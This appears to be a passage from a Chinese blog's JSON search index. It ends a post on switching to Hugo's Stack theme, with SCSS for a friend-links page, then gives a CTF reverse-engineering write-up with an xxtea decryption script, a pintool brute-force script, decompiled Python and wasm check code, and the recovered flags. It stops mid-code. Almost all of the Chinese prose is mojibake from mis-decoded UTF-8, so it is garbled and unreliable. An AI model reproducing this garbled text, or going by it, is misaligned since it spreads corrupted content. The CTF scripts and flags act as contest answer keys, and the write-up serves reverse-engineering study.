Themeï¼Œæƒ³æŠŠèƒŒæ™¯æ”¹ä¸€ä¸‹é¢œè‰²ï¼Œä½†æ˜¯å¤±è´¥äº†ï¼Œäºæ˜¯åˆæ‰¾äº†æ‰¾ä¸»é¢˜ï¼Œå‘ç° Stack æ›´å¥½çœ‹ï¼Œäºæ˜¯å¹²è„†å°±æ‹¿ Stack æ­äº†ï¼Œè€Œåæ¥æ‰å‘ç°ï¼ŒåŸæ¥é™†é˜Ÿçš„åšå®¢ä¹Ÿæ˜¯ stack ä¸»é¢˜ï¼Œçœ‹æ¥å®¡ç¾ä»æ¥æ²¡æœ‰å˜è¿‡ ğŸ˜‚ã€‚\näºæ˜¯ï¼Œåœ¨ Claudia é…ç½®å¤±è´¥åï¼Œæˆ‘æœæ–­è½¬åˆ°äº† Hugo Stack ä¸»é¢˜ã€‚\nç›®å‰çš„ä¿®æ”¹â€”â€”å‹é“¾ Stack ä¸»é¢˜æœ¬èº«æ˜¯ä¸å¸¦å‹é“¾çš„ï¼Œä½œè€…åº”è¯¥æ˜¯æ­£åœ¨å†™ï¼Œä½†æ¯”è¾ƒå¿™ï¼Œä¹Ÿä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™èƒ½å†™å®Œï¼Œäºæ˜¯å°±çœ‹äº†çœ‹åˆ«äººçš„æ–¹æ¡ˆã€‚ç›´æ¥æœèƒ½æœåˆ°ä¸€ä¸ªæ–¹æ¡ˆï¼Œä½†è®²å¾—ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œæ­å»ºå¤±è´¥äº†ã€‚åæ¥åœ¨ pull request é‡Œé¢å‘ç°æœ‰äººå®ç°äº†ä¸€ä¸ªï¼Œä½œè€…æ²¡æœ‰é‡‡çº³è€Œå·²ï¼Œäºæ˜¯å°±ä»¥è¿™ä¸ªä½œä¸ºä¸´æ—¶æ–¹æ¡ˆäº†ã€‚\nä¸»é¢˜ assets/scss/style.scss 27è¡Œæ·»åŠ ï¼š\n@import \u0026#34;partials/layout/links.scss\u0026#34;; æ–°å»º assets/scss/partials/layout/links.scss\n/* Place your custom SCSS in HUGO_SITE_FOLDER/assets/scss/custom.scss */ // å¤´åƒè¾¹æ¡†é¢œè‰² $avatar-border-color: #566a82; $avatar-border-color-dark: #C0C0C0; // style-card èƒŒæ™¯è‰² $friend-link-background-color: #51a8ca10; $friend-link-background-color-dark: #69697141; // å‹é“¾ name åŸå§‹è‰² $friend-link-color: #11a1a2; $friend-link-color-dark: #ffffff; // å‹é“¾ name æ°”æ³¡å“åº”å¯¹æ¯”è‰² $friend-link-hover-color: #ea4e2f; $friend-link-hover-color-dark:\trgb(241, 213, 159); // bio ç®€ä»‹ä¸Šä¸‹æ–‡ $context-color: #404040; $context-color-dark:\t#c0c0c0; // å‹é“¾å¤´åƒåŠå¤´åƒè¾¹æ¡†çš„æ ·å¼ .friend-avatar { width: 56px; height: 56px; padding: 2px; margin-top: 14px; margin-left: 14px; border-radius: 15px; border: 3.6px inset $avatar-border-color; [data-scheme=dark] \u0026amp; { border: 3.6px inset $avatar-border-color-dark; } } .friend-link-div { // å®ç°å¡ç‰‡åŒæ æ’åˆ—æ•ˆæœ height: auto; margin-top: auto; margin-inline-start: 4.5%; width: 43%; display: inline-block !important; // æ§åˆ¶ä¸Šä¸‹è¿ç»­æ’åˆ—çš„å¡ç‰‡ä¹‹é—´çš„è¡Œè· margin-bottom: 11px; // å¡ç‰‡åœ†è§’ border-radius: 7px 7px 7px 7px; // å¡ç‰‡é˜´å½± -webkit-box-shadow: 0px 14px 32px 0px rgba(231, 224, 224, 0.15); -moz-box-shadow: 0px 14px 32px 0px rgba(0, 0, 0, 0.15); box-shadow: 0.7px 1px 6px 0px rgba(0, 0, 0, 0.16); // å¡ç‰‡èƒŒæ™¯è‰² background: $friend-link-background-color; [data-scheme=dark] \u0026amp; { background: $friend-link-background-color-dark; } // å¡ç‰Œæ°”æ³¡å“åº”åŠ¨ç”» -webkit-transition: transform 0.4s ease; -moz-transition: transform 0.4s ease; -o-transition: transform 0.4s ease; transition: transform 0.15s ease; \u0026amp;:hover { transform: scale(1.03); } } .friend-link-avatar { width: 92px; float: left; margin-right: 2px; } // name ç‰¹æ•ˆæ ·å¼ï¼Œ hover æ°”æ³¡æ•ˆæœ,å‹é“¾ name å˜è‰² .friend-link-info { margin-top: 13px; margin-right: 18px; color: $friend-link-color; [data-scheme=dark] \u0026amp; { color: $friend-link-color-dark; } \u0026amp;:hover { color: $friend-link-hover-color; [data-scheme=dark] \u0026amp; { color: $friend-link-hover-color-dark; } } } // name æ–‡å­—æ ·å¼ .friend-name { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; font-style: normal; font-family: \u0026#39;Comic Sans MS\u0026#39;,cursive; font-size: 16px; } // bio æ–‡å­—æ ·å¼ .friend-bio { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; margin-top: auto; // font: 12px/1 Tahoma,Helvetica,Arial,\u0026#34;\\5b8b\\4f53\u0026#34;,sans-serif; font-family: Helvetica, \u0026#39;Hiragino Sans GB\u0026#39;, \u0026#39;Microsoft Yahei\u0026#39;, \u0026#39;å¾®è½¯é›…é»‘\u0026#39;, Arial, sans-serif; font-size: 14px; color: $context-color; [data-scheme=dark] \u0026amp; { color: $context-color-dark; } } // å“åº”å¼é¡µé¢ï¼Œå…è®¸æ ¹æ®ä¸åŒçš„å°ºå¯¸è°ƒæ•´æ ·å¼ @media screen and (max-width: 600px) { .friend-bio { display: none; } .friend-link-avatar { width: 84px; margin: auto; } .friend-link-info { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friend-name { font-size: 14px; } } æ¥ä¸‹æ¥åªéœ€è¦åœ¨è‡ªå·±çš„ page é¡µé¢ä¸‹åŠ ä¸ª links.md å³å¯\n--- title: \u0026#34;Links å‹æƒ…é“¾æ¥\u0026#34; date: 2021-10-01T16:45:06+08:00 slug: \u0026#34;links\u0026#34; layout: \u0026#34;links\u0026#34; license: false toc: false menu: main: weight: -80 pre: link --- ## Friends { {\u0026lt; friend name=\u0026#34;\u0026#34; url=\u0026#34;\u0026#34; avatar=\u0026#34;\u0026#34; bio=\u0026#34;\u0026#34; \u0026gt;} } ä¸¤ä¸ªå¤§æ‹¬å·ä¹‹é—´çš„ç©ºæ ¼éœ€è¦å»æ‰ï¼Œæˆ‘è¿™é‡Œä¸å»æ‰çš„è¯ä¼šæ˜¾ç¤ºå‹é“¾æ ‡ç­¾ï¼ˆç«Ÿç„¶æ²¡æœ‰è€ƒè™‘åˆ°ä»£ç å—çš„é—®é¢˜ï¼Œå¯ä»¥è€ƒè™‘æ issue äº†ï¼‰ ç›®å‰çš„é—®é¢˜ åœ¨è¿ç§»åšå®¢çš„æ—¶å€™é¡ºä¾¿ç¨å¾®æ•´åˆäº†ä¸€ä¸‹ä»¥å‰çš„ä¸€äº›æ–‡ç« ï¼Œä½†åŒæ—¶ä¹Ÿå‘ç°äº†é—®é¢˜ï¼Œä¹‹å‰ç”¨ Hexo çš„æ—¶å€™ï¼Œä¹ æƒ¯ç”¨ \u0026lt;--!more--\u0026gt; æ¥å†™æ‘˜è¦ï¼Œæ‰€ä»¥å°±ä½¿å¾—æ‘˜è¦ä¹ æƒ¯æ€§åœ°æ”¾äº†ç›®å½•ï¼Œç›®å‰è¿˜æ²¡èƒ½åœ¨ Hugo ä¸­æ‰¾åˆ°å¯¹åº”çš„è§£å†³æ–¹æ¡ˆï¼Œæ‰€ä»¥å¯èƒ½ä»¥åçš„åšå®¢å½’çº³æ€è·¯éœ€è¦æ”¹ä¸€æ”¹ï¼Œä½†ä¹‹å‰çš„åº”è¯¥å°±è¿™æ ·äº†ã€‚\n","date":"2021-12-21T23:23:50+08:00","image":"/post/migrate-to-hugo/hugo-stack-logo_hu68d4500f44eeff3c046abd6af3014f70_562499_120x120_fill_q75_box_smart1.jpg","permalink":"/post/migrate-to-hugo/","title":"Migrate to Hugo"},{"content":" æ‰“ç¾å›¢ CTF çš„æ—¶å€™æ‰æ„è¯†åˆ°ï¼Œæœ‰ä¸€ç§åç‰¢å«AK\n[MTCTF 4th]wow å…ˆè¿›è¡Œè„±å£³ï¼Œå› ä¸ºè„±å£³åç”¨çš„æ˜¯ç»å¯¹åœ°å€ï¼Œè€ŒåŠ è½½çš„æ—¶å€™æ˜¯åŠ¨æ€åŠ è½½ï¼Œæ‰€æœ‰æ²¡æœ‰åŠæ³•è°ƒè¯•ï¼Œé‚£å°±ç›´æ¥é™æ€çœ‹å§\nJUMPOUT é‚£é‡Œçœ‹ä¸€ä¸‹æ±‡ç¼–ï¼Œå‘ç°æœ‰ä¸€ä¸ªå¤©å ‚ä¹‹é—¨\npush 0x33 call $+5 add [esp+84h+var_84], 5 retf ç›´æ¥æŠŠåé¢çš„æ•°æ®å…¨ dump å‡ºæ¥ï¼Œç„¶åç”¨ ida64 æ‰“å¼€\nvoid __fastcall sub_0(unsigned int *a1) { unsigned int v1; // er9 int v2; // ebp unsigned int v3; // esi unsigned int *v4; // rdi unsigned int *v5; // r10 unsigned int v6; // ebx unsigned int i; // er11 unsigned int v8; // er8 int v9; // edx unsigned int v10; // eax unsigned int v11; // er9 unsigned int v12; // er8 int v13; // ebx int v14; // ebx int v15; // ebx int v16; // edx unsigned int v17; // eax unsigned int v18; // er9 v1 = a1[8]; v2 = 12; v3 = 0; while ( 1 ) { v3 += 1732584193; v4 = a1 + 1; v5 = a1; v6 = v3 \u0026gt;\u0026gt; 2; for ( i = 0; i \u0026lt; 8; ++i ) { v8 = *v4; if ( (((unsigned __int8)i ^ (unsigned __int8)v6) \u0026amp; 3) != 0 ) { switch ( ((unsigned __int8)i ^ (unsigned __int8)v6) \u0026amp; 3 ) { case 1: v9 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v8); v10 = v1; v11 = v1 ^ 0x10325476; break; case 2: v9 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v8); v10 = v1; v11 = v1 ^ 0x98BADCFE; break; case 3: v9 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v8); v10 = v1; v11 = v1 ^ 0xC3D2E1F0; break; default: goto LABEL_12; } } else { v9 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v8); v10 = v1; v11 = v1 ^ 0xEFCDAB89; } *v5 += (v11 + (v3 ^ v8)) ^ (((16 * v10) ^ (v8 \u0026gt;\u0026gt; 3)) + v9); v1 = *v5; LABEL_12: ++v4; ++v5; } v12 = *a1; v13 = ((unsigned __int8)i ^ (unsigned __int8)v6) \u0026amp; 3; if ( !v13 ) { v16 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v12); v17 = v1; v18 = v1 ^ 0xEFCDAB89; goto LABEL_21; } v14 = v13 - 1; if ( !v14 ) { v16 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v12); v17 = v1; v18 = v1 ^ 0x10325476; goto LABEL_21; } v15 = v14 - 1; if ( !v15 ) { v16 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v12); v17 = v1; v18 = v1 ^ 0x98BADCFE; LABEL_21: a1[8] += (v18 + (v3 ^ v12)) ^ (((16 * v17) ^ (v12 \u0026gt;\u0026gt; 3)) + v16); v1 = a1[8]; goto LABEL_22; } if ( v15 == 1 ) { v16 = (v1 \u0026gt;\u0026gt; 5) ^ (4 * v12); v17 = v1; v18 = v1 ^ 0xC3D2E1F0; goto LABEL_21; } LABEL_22: if ( !--v2 ) __asm { retfq } } } æ˜¯ä¸€ä¸ª xxteaï¼Œç”¨ switch æ¥åˆ¤æ–­ä½¿ç”¨å“ªä¸ª keyï¼Œround æ˜¯ 12ï¼Œæ‰€ä»¥ç›´æ¥ç”¨è„šæœ¬è§£å¯†å°±è¡Œ\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define DELTA 0x67452301 #define MX (((z\u0026gt;\u0026gt;5^y\u0026lt;\u0026lt;2) + (y\u0026gt;\u0026gt;3^z\u0026lt;\u0026lt;4)) ^ ((sum^y) + (key[(p\u0026amp;3)^e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u0026gt; 1) /* Coding Part */ { printf(\u0026#34;No use\u0026#34;); } else if (n \u0026lt; -1) /* Decoding Part */ { n = -n; // rounds = 6 + 52/n; rounds = 12; sum = rounds*DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p=n-1; p\u0026gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } int main() { unsigned int v[10] = { 3640088821u, 1382566363u, 3805750627u, 1214181292u, 1620003782u, 1482291050u, 2956289443u, 1044419009u, 3554368410u, 0u }; uint32_t const k[4]= {0xEFCDAB89u, 0x10325476u, 0x98BADCFEu, 0xC3D2E1F0u}; int n= -9; //nçš„ç»å¯¹å€¼è¡¨ç¤ºvçš„é•¿åº¦ï¼Œå–æ­£è¡¨ç¤ºåŠ å¯†ï¼Œå–è´Ÿè¡¨ç¤ºè§£å¯† // vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•° // kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½ btea(v, n, k); printf(\u0026#34;%s\\n\u0026#34;, v); return 0; } [MTCTF 4th]Superflat è¿™ä¸ªé¢˜ç”¨äº† movfuscatorï¼Œæ­£å¥½å‰æ®µæ—¶é—´æœ‰äººåœ¨ç¾¤é‡Œæè¿‡ï¼Œä¸€ä¸‹å°±æƒ³èµ·æ¥äº†\nä½†è¦è§£æ··æ·†éœ€è¦è£…ä¸€ä¸ª demov çš„å·¥å…·ï¼Œé…ç½®ç¯å¢ƒæœ‰ç‚¹å¤æ‚\nè€ƒè™‘åˆ°è¿™ä¸ªç¨‹åºä¸­æ²¡æœ‰ä»»ä½•çš„åŠ¨æ€é“¾æ¥è¿‡ç¨‹ï¼Œè€Œä¸”èƒ½çœ‹åˆ°ä¸¤ä¸ªå‡½æ•°å getchar å’Œ putcharï¼Œé‚£å¤§èƒ†çŒœæµ‹æ˜¯æŒ‰ç…§æ¯ä¸€ä½æ¥åˆ¤æ–­çš„ï¼Œå¯ä»¥è€ƒè™‘ä¸Š pintools\nå…ˆæ‰‹åŠ¨æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¯¹äºåŒæ ·çš„è¾“å…¥ï¼Œæ‰§è¡Œçš„æŒ‡ä»¤æ•°å­—å®Œå…¨ç›¸åŒï¼Œå¹¶ä¸”æ¯æ­£ç¡®ä¸€ä½ä¼šå¢åŠ  4888 æ¡æŒ‡ä»¤ï¼Œäºæ˜¯æ ¹æ® pintools è¿™ä¸ªå·¥å…·è‡ªå·±å†™ä¸ªçˆ†ç ´è„šæœ¬\nåœ¨çˆ†ç ´å‰çœ‹äº†ä¸€ä¸‹ output æ–‡ä»¶ï¼Œå‘ç°æ€»é•¿åº¦æ˜¯42ä½ï¼Œäºæ˜¯ç›´æ¥çŒœæµ‹ flag æ ¼å¼ä¸º flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} å…¶ä¸­ x ä¸º [0-9a-f] ï¼ˆå°å†™å­—æ¯æ˜¯æ‰‹åŠ¨çˆ†ç ´äº†ç¬¬ä¸€ä½ç¡®å®šçš„ï¼‰\nimport subprocess password = \u0026#34;flag{d06f0bcc-xxxxxxxxxxxxxxxxxxxxxxxxxxx}\u0026#34; cur_pos = 14 last_count = 693225 while cur_pos \u0026lt; len(password) - 1: for i in \u0026#34;0123456789abcdef-\u0026#34;: command = \u0026#34;echo \u0026#34; + password[:cur_pos] + i + password[cur_pos+1:] + \u0026#34; | ./pin-3.18-98332-gaebd7b1e6-gcc-linux/pin -t ./pin-3.18-98332-gaebd7b1e6-gcc-linux/source/tools/ManualExamples/obj-ia32/inscount0.so -- ./superflat; cat inscount.out\u0026#34; output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE) count = int(output.split(b\u0026#39;\\n\u0026#39;)[1].split()[1].decode()) if count - last_count \u0026gt; 0: print (i) password = password[:cur_pos] + i + password[cur_pos + 1:] cur_pos += 1 last_count = count break else: print (\u0026#34;\\nerror:\u0026#34;, cur_pos) break # flag{d06f0bcc-93e0-9c5b-161e-e1464176d395} ç¬¬ä¸€æ¬¡åœ¨æ¯”èµ›ä¸­ç”¨ä¸Š pintoolï¼Œçºªå¿µä¸€ä¸‹\n[SECCONCTF 2021]dis-me python é€†å‘ï¼Œä¸€ä¸Šçº¿å°±è¢«å«æ¥åšè¿™é¢˜äº†ï¼ˆå±äºæ˜¯æŠŠ python é¢˜ç›®åŒ…åœºäº†ï¼‰\nå…ˆè‡ªå·±çœ‹äº†çœ¼å­—èŠ‚ç ï¼Œç„¶ååˆ¤æ–­äº†ä¸€ä¸‹ï¼Œåˆ äº†ä¸€äº›ä¸œè¥¿ï¼Œå† pycdc åç¼–è¯‘ï¼ŒåŒæ—¶ç»“åˆç€è‡ªå·±çš„åˆ†æï¼Œæ‹¿åˆ°äº†åç¼–è¯‘ç»“æœ\nimport marshal import base64 import types f = open(__file__, \u0026#39;rb\u0026#39;) f.seek(12) s = marshal.loads(f.read()).co_code[4:] types.FunctionType(marshal.loads(base64.b64decode(bytes([((y - x * 7 - 45) % 256) for x, y in enumerate((s[2 : 2 + s[0] * 256 + s[1]]))]))), globals())() del s del f del marshal del base64 del types return None è¯»å–äº†è‡ªèº«æ–‡ä»¶ï¼Œç„¶ååç§»æ”¹åˆ°äº† 12ï¼Œå°±æ˜¯è·³è¿‡äº†æ–‡ä»¶å¤´ï¼Œç›´æ¥ä» E3 00 00 00 å¼€å§‹ï¼Œæ˜¯ marshal çš„æ­£ç¡®æ ¼å¼ï¼ˆä½†è‡ªå·±å†™çš„æ—¶å€™æœ‰ä¸€äº›é—®é¢˜ï¼Œä¸å¤ªæ‡‚äº†ï¼‰\næ¥ä¸‹æ¥ .co_code[4:] çŒœæµ‹æ˜¯å–äº†ä»£ç æ®µï¼Œå¹¶ä»ä¸‹æ ‡ä¸º 4 çš„åœ°æ–¹å¼€å§‹å–\ns[2 : 2 + s[0] * 256 + s[1]]ï¼šæ¥ä¸‹æ¥æ ¹æ®å–å‡ºæ•°æ®çš„å‰ä¸¤ä½æ¥åˆ¤æ–­æ¥ä¸‹æ¥å–å‡ºæ•°æ®çš„æ€»é•¿åº¦ï¼Œå¹¶ä¸”è·³è¿‡äº†å‰ä¸¤ä½\näºæ˜¯æœ€ç»ˆå–å‡ºçš„æ•°æ®ä¸º 0x2C å¼€å§‹çš„æ•°æ®ï¼Œä¸€ç›´å–åˆ° 64 00 64 01 è¿™ä¸ªæ­£ç¡®ç¨‹åºçš„å¼€å¤´éƒ¨åˆ†\ntypes é‚£ä¸€è¡Œé‡Œé¢çš„ bytes([((y - x * 7 - 45) % 256) for x, y in enumerate((s[2 : 2 + s[0] * 256 + s[1]]))]) ä¸€å¼€å§‹å¹¶æ²¡æœ‰åˆ†æå‡ºæ¥ï¼Œä¸»è¦æ˜¯ä½ç½®ä¸ç¡®å®šï¼Œäºæ˜¯è‡ªå·±æ‹¿æ•°æ®è¯•äº†è¯•å¯èƒ½çš„å‡ ä¸ªæ–¹æ¡ˆï¼Œå‘ç°è¿™æ ·å¯ä»¥å¾—åˆ° base64çš„ç»“æœï¼Œå°±è¯´æ˜æ˜¯è¿™ä¸ªäº†\nå°† base64 çš„ç»“æœè§£ç åˆ°æ–‡ä»¶ï¼Œç„¶åè¡¥å…¨æ–‡ä»¶å¤´å uncompyle6 åç¼–è¯‘ï¼Œå¾—åˆ°æ­£ç¡®çš„æµç¨‹\nf = lambda n: n if n \u0026lt;= 1 else (f(n - 1) + f(n - 2)) % 10 flag = input(\u0026#39;Input the flag \u0026gt; \u0026#39;) s = 1 if flag.startswith(\u0026#39;SECCON{\u0026#39;): if flag.endswith(\u0026#39;}\u0026#39;): if len(flag) == 40: s = sum(abs(ord(c) - ord(str(f(i)))) for i, c in enumerate(flag[7:-1])) s or print(\u0026#39;Correct! The flag is\u0026#39;, flag) else: print(\u0026#39;Wrong :(\u0026#39;) ç›´æ¥æŠŠ str(f(i)) è·‘ä¸€éå°±æ‹¿åˆ° flag äº†ï¼ˆæ–æ³¢é‚£å¥‘ï¼‰\n[SECCONCTF 2021]flag è¿™é“é¢˜æ˜¯ä¸ª wasm é€†å‘ï¼Œäººç”Ÿç¬¬ä¸€æ¬¡åšå‡ºæ¥ï¼Œå€¼å¾—çºªå¿µ\nå…ˆä»ç½‘ç«™ä¸ŠæŠŠ wasm æ–‡ä»¶ä¸‹è½½ä¸‹æ¥\nç¬¬ä¸€æ­¥è‚¯å®šæ˜¯ wasm2c ä¸€ä¸‹\n./wasm2c 0001d242.wasm -o out.c æ¥ä¸‹æ¥è¿›è¡Œç¼–è¯‘\ng++ -c out.c -o out.o ç”¨ ida æ‰“å¼€ï¼Œå‘ç°ä¸€ä¸ªå« check çš„å‡½æ•°ï¼Œåˆ°ç½‘ç«™çš„ js é‡Œé¢åŠ¨è°ƒåˆ° checkï¼Œå¯ä»¥è·å–åŠ è½½çš„æ•°æ®\ncheck(input, \u0026#34;NekoPunch\u0026#34;, \u0026#34;6dbf84f73cf6a112268b09525ea550a665e21cb2e3e13af7e3ea0ecb52f5b9cda5b6522b1e978734553f1d7956d4af94bfc3f4d68c8fba9eeecf4035550b9106f70d57d1a6cdaf3211eaaa78d71a9038b71be621241e8b608a43b107f8860f543ab0189aa063800de4bae7d0b11045b8\u0026#34;) äºæ˜¯çœ‹ä¸€ä¸‹ check å‡½æ•°å°±è¡Œ\nv6 = w2c_g0; i32_store(\u0026amp;w2c_memory, (unsigned int)w2c_g0 + 40LL, a1); // çœç•¥ v7 = i32_load(\u0026amp;w2c_memory, v6 + 40LL); v8 = i32_load(\u0026amp;w2c_memory, v6 + 40LL); v9 = w2c_f25(v8) - 1; v52 = w2c_f21(v7, v9); if ( (char)i32_load8_u(\u0026amp;w2c_memory, v52) == \u0026#39;}\u0026#39; wasm æ˜¯åŸºäºå †æ ˆçš„ï¼Œè¿™é‡Œæ˜æ˜¾èƒ½çœ‹åˆ°æ ˆçš„ç—•è¿¹ï¼Œä¸Šæ¥å…ˆæŠŠç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆè¾“å…¥å­—ç¬¦ä¸²çš„åœ°å€ï¼‰å­˜åˆ°äº† v6+40 çš„åœ°æ–¹ï¼ˆçŒœæµ‹v6æ˜¯æ ˆé¡¶ï¼‰\né€šè¿‡ç¬¬ä¸€æ¡ if æ¯”è¾ƒï¼ŒçŒœæµ‹ v52 æ˜¯è¾“å…¥çš„æœ€åä¸€ä½ï¼Œè¿™æ ·å°±å¯ä»¥çŸ¥é“ w2c_f25 æ˜¯è®¡ç®—é•¿åº¦ï¼Œw2c_f21 ç›¸å½“äº a1[a2]\næ¥ä¸‹æ¥æ³¨æ„åˆ°ä¸­é—´æœ‰ä¸€ä¸ªéå¸¸æ•´é½çš„å¾ªç¯\nwhile ( (int)i32_load(\u0026amp;w2c_memory, v6 + 12LL) \u0026lt; 128 ) { v22 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v22, 0, 4u, 8u, 0xCu); v23 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v23, 5u, 9u, 0xDu, 1u); v24 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v24, 0xAu, 0xEu, 2u, 6u); v25 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v25, 0xFu, 3u, 7u, 0xBu); v26 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v26, 0, 1u, 2u, 3u); v27 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v27, 5u, 6u, 7u, 4u); v28 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v28, 0xAu, 0xBu, 8u, 9u); v29 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_f23(v29, 0xFu, 0xCu, 0xDu, 0xEu); v57 = i32_load(\u0026amp;w2c_memory, v6 + 12LL) + 1; i32_store(\u0026amp;w2c_memory, v6 + 12LL, v57); } æ˜¾ç„¶ v6+12 çš„åœ°æ–¹å­˜çš„æ˜¯å¾ªç¯æ¬¡æ•°ï¼Œè¿™ä¸ªæ ¼å¼å’Œå‰æ®µæ—¶é—´å­¦çš„ salsa20 å¾ˆåƒ\næŸ¥çœ‹ w2c_f23 å‡½æ•°\ni32_store(\u0026amp;w2c_memory, (unsigned int)(w2c_g0 - 32) + 28LL, a1); i32_store(\u0026amp;w2c_memory, v9 + 24LL, a2); i32_store(\u0026amp;w2c_memory, v9 + 20LL, a3); i32_store(\u0026amp;w2c_memory, v9 + 16LL, a4); i32_store(\u0026amp;w2c_memory, v9 + 12LL, a5); v10 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v11 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v10; v12 = i32_load8_u(\u0026amp;w2c_memory, v11); v13 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v14 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v13; v15 = i32_load8_u(\u0026amp;w2c_memory, v14); v16 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v17 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v16; v18 = i32_load8_u(\u0026amp;w2c_memory, v17); v19 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v20 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v19; v21 = i32_load8_u(\u0026amp;w2c_memory, v20); v22 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v23 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v22; v24 = (((int)(unsigned __int8)(v21 + v18) \u0026gt;\u0026gt; 7) | (2 * (unsigned __int8)(v15 + v12))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v23); i32_store8(\u0026amp;w2c_memory, v23, v24); // x[b] ^= ROL((x[d] + x[a]), 1) v25 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v26 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v25; v27 = i32_load8_u(\u0026amp;w2c_memory, v26); v28 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v29 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v28; v30 = i32_load8_u(\u0026amp;w2c_memory, v29); v31 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v32 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v31; v33 = i32_load8_u(\u0026amp;w2c_memory, v32); v34 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v35 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v34; v36 = i32_load8_u(\u0026amp;w2c_memory, v35); v37 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v38 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v37; v39 = (((int)(unsigned __int8)(v36 + v33) \u0026gt;\u0026gt; 6) | (4 * (unsigned __int8)(v30 + v27))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v38); i32_store8(\u0026amp;w2c_memory, v38, v39); // x[c] ^= ROL((x[a] + x[b]), 2) v40 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v41 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v40; v42 = i32_load8_u(\u0026amp;w2c_memory, v41); v43 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v44 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v43; v45 = i32_load8_u(\u0026amp;w2c_memory, v44); v46 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v47 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v46; v48 = i32_load8_u(\u0026amp;w2c_memory, v47); v49 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v50 = i32_load(\u0026amp;w2c_memory, v9 + 20LL) + v49; v51 = i32_load8_u(\u0026amp;w2c_memory, v50); v52 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v53 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v52; v54 = (((int)(unsigned __int8)(v51 + v48) \u0026gt;\u0026gt; 5) | (8 * (unsigned __int8)(v45 + v42))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v53); i32_store8(\u0026amp;w2c_memory, v53, v54); // x[d] ^= ROL((x[b] + x[c]), 3) v55 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v56 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v55; v57 = i32_load8_u(\u0026amp;w2c_memory, v56); v58 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v59 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v58; v60 = i32_load8_u(\u0026amp;w2c_memory, v59); v61 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v62 = i32_load(\u0026amp;w2c_memory, v9 + 12LL) + v61; v63 = i32_load8_u(\u0026amp;w2c_memory, v62); v64 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v65 = i32_load(\u0026amp;w2c_memory, v9 + 16LL) + v64; v66 = i32_load8_u(\u0026amp;w2c_memory, v65); v67 = i32_load(\u0026amp;w2c_memory, v9 + 28LL); v68 = i32_load(\u0026amp;w2c_memory, v9 + 24LL) + v67; v69 = (((int)(unsigned __int8)(v66 + v63) \u0026gt;\u0026gt; 4) | (16 * (unsigned __int8)(v60 + 